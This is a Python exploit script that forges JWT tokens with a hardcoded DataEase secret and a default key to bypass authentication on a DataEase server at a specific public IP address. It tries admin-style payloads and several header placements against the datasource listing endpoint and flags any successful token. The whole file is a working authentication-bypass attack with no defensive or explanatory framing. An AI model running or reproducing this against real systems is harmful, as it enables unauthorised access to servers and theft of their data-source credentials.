import requests
import json
import time
import hmac
import hashlib
import base64

base = 'http://47.236.78.123:8100'

# Approach: Try to forge a JWT token using known patterns
# DataEase <= 2.10.1 had a hardcoded JWT secret

def create_jwt(payload, secret):
    header = {"alg": "HS256", "typ": "JWT"}
    
    def b64url(data):
        return base64.urlsafe_b64encode(json.dumps(data, separators=(',', ':')).encode()).rstrip(b'=').decode()
    
    h = b64url(header)
    p = b64url(payload)
    signing_input = f"{h}.{p}"
    signature = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    sig = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
    return f"{h}.{p}.{sig}"

# Try different JWT payloads and secrets
secrets = [
    '83d923c9f1d8fcaa46cae0ed2aaa81b5',  # Known hardcoded secret
    'DataEaseKey',  # Default dekey
]

payloads = [
    {"uid": 1, "oid": 1, "exp": int(time.time()) + 3600},
    {"uid": "1", "oid": "1", "exp": int(time.time()) + 3600},
    {"sub": "admin", "exp": int(time.time()) + 3600},
    {"uid": 1, "oid": 1, "sub": "admin", "exp": int(time.time()) + 3600},
]

for secret in secrets:
    for payload in payloads:
        token = create_jwt(payload, secret)
        
        # Try using this token to call an API
        headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json'
        }
        try:
            r = requests.post(f'{base}/de2api/datasource/list', headers=headers, json={}, timeout=5)
            print(f'Secret: {secret[:20]}..., Payload: {payload}')
            print(f'  Status: {r.status_code}, Response: {r.text[:200]}')
            
            if r.status_code == 200 and r.json().get('code') == 0:
                print(f'  *** SUCCESS! Token: {token[:50]}...')
                break
        except Exception as e:
            print(f'  Error: {e}')
    print()

# Also try putting the token in different headers
token_test = create_jwt({"uid": 1, "oid": 1, "exp": int(time.time()) + 3600}, '83d923c9f1d8fcaa46cae0ed2aaa81b5')
for header_name in ['Authorization', 'X-DE-TOKEN', 'DE-TOKEN', 'token']:
    for prefix in ['Bearer ', '']:
        headers = {header_name: f'{prefix}{token_test}', 'Content-Type': 'application/json'}
        try:
            r = requests.get(f'{base}/de2api/datasource/list', headers=headers, timeout=5)
            if r.status_code != 401:
                print(f'Header {header_name} with prefix "{prefix}": Status {r.status_code}, {r.text[:200]}')
        except:
            pass
